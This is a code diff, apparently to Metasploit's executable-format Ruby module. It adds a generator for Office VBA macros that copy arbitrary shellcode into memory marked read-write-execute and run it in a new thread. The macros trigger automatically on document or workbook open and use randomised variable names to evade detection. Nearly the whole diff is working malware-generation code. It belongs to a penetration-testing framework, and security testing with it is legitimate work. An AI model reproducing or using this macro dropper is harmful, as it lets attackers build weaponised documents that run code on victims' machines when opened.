@@ -807,6 +807,70 @@ require 'digest/sha1'
 		return vba
 	end
 
+	def self.to_vba(framework,code,opts={})
+		var_myByte    = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_myArray   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_rwxpage   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_res       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_offset    = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_lpThreadAttributes = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_dwStackSize        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_lpStartAddress     = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_lpParameter        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_dwCreationFlags  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_lpThreadID       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_lpAddr           = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_lSize            = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_flAllocationType = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_flProtect        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_lDest        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_Source       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+		var_Length       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+
+		# put the shellcode bytes into an array
+		bytes = ''
+		maxbytes = 20
+		codebytes = code.unpack('C*')
+		1.upto(codebytes.length) do |idx|
+			bytes << codebytes[idx].to_s
+			bytes << "," if idx < codebytes.length - 1
+			bytes << " _\r\n" if (idx > 1 and (idx % maxbytes) == 0)
+		end
+
+		"#If Vba7 Then 
+Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal #{var_lpThreadAttributes} As Long, ByVal #{var_dwStackSize} As Long, ByVal #{var_lpStartAddress} As LongPtr, #{var_lpParameter} As Long, ByVal #{var_dwCreationFlags} As Long, #{var_lpThreadID} As Long) As LongPtr
+Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal #{var_lpAddr} As Long, ByVal #{var_lSize} As Long, ByVal #{var_flAllocationType} As Long, ByVal #{var_flProtect} As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As LongPtr, ByRef #{var_Source} As Any, ByVal #{var_Length} As Long) As LongPtr
+#Else 
+Private Declare Function CreateThread Lib \"kernel32\" (ByVal #{var_lpThreadAttributes} As Long, ByVal #{var_dwStackSize} As Long, ByVal #{var_lpStartAddress} As Long, #{var_lpParameter} As Long, ByVal #{var_dwCreationFlags} As Long, #{var_lpThreadID} As Long) As Long
+Private Declare Function VirtualAlloc Lib \"kernel32\" (ByVal #{var_lpAddr} As Long, ByVal #{var_lSize} As Long, ByVal #{var_flAllocationType} As Long, ByVal #{var_flProtect} As Long) As Long
+Private Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As Long, ByRef #{var_Source} As Any, ByVal #{var_Length} As Long) As Long
+#EndIf
+
+Sub Auto_Open()
+	Dim #{var_myByte} As Long, #{var_myArray} As Variant, #{var_offset} As Long
+#If Vba7 Then 
+	Dim  #{var_rwxpage} As LongPtr, #{var_res} As LongPtr
+#Else 
+	Dim  #{var_rwxpage} As Long, #{var_res} As Long
+#EndIf
+	#{var_myArray} = Array(#{bytes})
+	#{var_rwxpage} = VirtualAlloc(0, UBound(#{var_myArray}), &H1000, &H40)
+	For #{var_offset} = LBound(#{var_myArray}) To UBound(#{var_myArray})
+		#{var_myByte} = #{var_myArray}(#{var_offset})
+		#{var_res} = RtlMoveMemory(#{var_rwxpage} + #{var_offset}, #{var_myByte}, 1)
+	Next #{var_offset}
+	#{var_res} = CreateThread(0, 0, #{var_rwxpage}, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+	Auto_Open
+End Sub
+Sub Workbook_Open()
+	Auto_Open
+End Sub
+"
+	end
+
 	def self.to_win32pe_vba(framework, code, opts={})
 		to_exe_vba(to_win32pe(framework, code, opts))
 	end
@@ -1639,6 +1703,9 @@ require 'digest/sha1'
 			output = Msf::Util::EXE.to_osx_x86_macho(framework, code, exeopts)
 
 		when 'vba'
+			output = Msf::Util::EXE.to_vba(framework, code, exeopts)
+
+		when 'vba-exe'
 			exe = Msf::Util::EXE.to_win32pe(framework, code, exeopts)
 			output = Msf::Util::EXE.to_exe_vba(exe)
 
@@ -1664,7 +1731,7 @@ require 'digest/sha1'
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','elf','macho','vba','vbs','loop-vbs','asp','war']
+		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','war']
 	end
 
 	#
